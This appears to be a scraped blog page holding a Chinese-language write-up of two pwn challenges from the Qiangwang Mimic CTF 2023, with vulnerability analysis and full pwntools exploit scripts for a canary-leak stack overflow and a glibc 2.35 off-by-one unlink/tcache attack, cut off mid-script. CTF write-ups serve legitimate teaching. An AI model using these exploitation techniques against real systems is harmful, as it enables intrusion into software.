<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OBJS=	open.o read_write.o inode.o file_table.o buffer.o super.o \</span><br><span class="line">	block_dev.o char_dev.o file_dev.o stat.o exec.o pipe.o namei.o \</span><br><span class="line">	bitmap.o fcntl.o ioctl.o truncate.o proc.o</span><br><span class="line">	</span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line"><span class="section">proc.o: proc.c ../include/string.h ../include/linux/sched.h \</span></span><br><span class="line">  ../<span class="keyword">include</span>/linux/head.h ../<span class="keyword">include</span>/linux/fs.h ../<span class="keyword">include</span>/sys/types.h \</span><br><span class="line">  ../<span class="keyword">include</span>/linux/mm.h ../<span class="keyword">include</span>/signal.h ../<span class="keyword">include</span>/linux/kernel.h</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<img src="/2023/11/17/HIT-OSLab8/1700220159392.png" class width="1700220159392">   

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/16/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2023/" class="post-title-link" itemprop="url">强网拟态CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-16 01:50:32 / Modified: 01:52:52" itemprop="dateCreated datePublished" datetime="2023-11-16T01:50:32+08:00">2023-11-16</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>43k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>39 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="controller-pwn"><a href="#controller-pwn" class="headerlink" title="controller_pwn"></a>controller_pwn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">controller_pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=b99c4c5065054620d93caef36ed671bfc30aa74b, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>简单栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fflush(_bss_start);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK,get password %s:\n&quot;</span>, buf);</span><br><span class="line">fflush(_bss_start);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br></pre></td></tr></table></figure>
<p>有后门：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>第一个溢出泄露 canary，第二个溢出覆盖返回地址为后门地址</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./controller_pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn-26afcd498d.challenge.xctf.org.cn&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>,ssl=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x8B8)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;command&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>+<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;OK,get password&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_data = u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">canary = leak_data * <span class="number">0x100</span></span><br><span class="line">success(<span class="string">&quot;leak_data &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_data))</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.send(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&quot;b&quot;</span>*<span class="number">0x8</span>+p8(<span class="number">0xa</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="noob-heap"><a href="#noob-heap" class="headerlink" title="noob_heap"></a>noob_heap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.4</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">noob_heap1: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter ./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">5017</span>d1695b20f77ecbb13c419848ac70f4edbafc, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A == ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0003</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A != execve) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A != ptrace) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000009d</span>  <span class="keyword">if</span> (A != prctl) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>有 off-by-one 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note: &quot;</span>);</span><br><span class="line">  chunk = chunk_list[index];</span><br><span class="line">  chunk[read(<span class="number">0</span>, chunk, size_list[index])] = <span class="number">0</span>;<span class="comment">// off-by-one</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>有 off-by-one 漏洞，因此需要打 unlink attack</p>
<p>本题目限制 chunk 大小，需要利用 scanf 中的 malloc 来触发 fast chunk 合并，得到 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))*<span class="number">0x1000</span></span><br><span class="line">heap_base = leak_addr</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    dele(i+<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a0f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>这里需要利用 fast chunk 的合并机制，堆布局如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(fastbins)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55722449c810 <span class="comment">/* chunk1 */</span></span></span><br><span class="line"><span class="function">Size: 0x81</span></span><br><span class="line"><span class="function">fd: 0x5577736b8c0c</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(fastbins)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55722449c890 <span class="comment">/* chunk2 */</span></span></span><br><span class="line"><span class="function">Size: 0x81</span></span><br><span class="line"><span class="function">fd: 0x55722449c</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55722449c910 <span class="comment">/* chunk3 */</span></span></span><br><span class="line"><span class="function">Size: 0x81</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x55722449c990 <span class="comment">/* chunk4 */</span></span></span><br><span class="line"><span class="function">Size: 0x101</span></span><br><span class="line"><span class="function">fd: 0x7fdeb0a19ce0</span></span><br><span class="line"><span class="function">bk: 0x7fdeb0a19ce0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过 chunk3 覆盖 chunk4-&gt;size 的P位，同时在 chunk3 中伪造 fd，bk（为了通过 unlink 检查）</li>
<li>使用 scanf 触发 fast chunk 合并：<ul>
<li>首先 chunk4 会进入 smallbin</li>
<li>程序读取 chunk4-&gt;size 的P位为“0”，误以为 chunk3 是 fast chunk</li>
<li>程序将 chunk1，chunk2，chunk3 这3个 fast chunk 合并</li>
</ul>
</li>
</ul>
<p>测试样例如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">fake_heap_addr = heap_base + <span class="number">0x910</span></span><br><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(fake_heap_addr+<span class="number">0x18</span>)+p64(fake_heap_addr+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_heap_addr)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">13</span>,payload.ljust(<span class="number">0x70</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(<span class="number">0x80</span>))</span><br><span class="line">cmd(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">cmd(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br></pre></td></tr></table></figure>
<p>由于相邻 chunk-&gt;size 的P位为“1”，需要一些堆风水才能将 chunk3 申请回来，之后就可以实现 UAF</p>
<p>最后劫持 tcache，先通过 <code>environ</code> 泄露 <code>stack_addr</code>，后劫持返回地址写入 ORW 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./noob_heap1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span 